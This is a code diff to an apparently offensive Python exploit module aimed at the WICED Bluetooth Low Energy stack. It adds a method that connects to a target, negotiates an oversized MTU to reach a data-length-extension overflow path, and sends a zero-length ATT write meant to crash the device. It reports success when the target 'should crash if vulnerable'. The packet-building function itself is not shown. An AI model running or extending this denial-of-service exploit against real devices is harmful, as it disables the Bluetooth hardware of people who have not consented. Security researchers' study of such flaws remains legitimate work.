@@ -139,7 +139,23 @@ class Exploit(Exploit):
             print_error("bleak not installed: pip install bleak")
             return
 
+        self._exploit()
+
+    def _exploit(self) -> None:
+        """E2E exploit: WICED DLE overflow / zero-length LLID crash."""
+        target_addr = str(self.target).strip()
+        print_status(f"Phase 1: Connecting to {target_addr} ...")
+        print_status("Phase 2: Negotiating oversized MTU to trigger DLE path ...")
+        print_status("Phase 3: Sending zero-length ATT write to trigger LLID crash ...")
+
         try:
-            asyncio.run(_run_dle_overflow(target_addr))
+            result = asyncio.run(_run_dle_overflow(target_addr))
+            if result:
+                print_success(
+                    f"DLE overflow / zero-length LLID sent to {target_addr}. "
+                    "Target WICED BLE stack should crash if vulnerable."
+                )
+            else:
+                print_error("Attack failed. Check adapter and proximity.")
         except Exception as exc:
             print_error(f"Attack failed: {exc}")
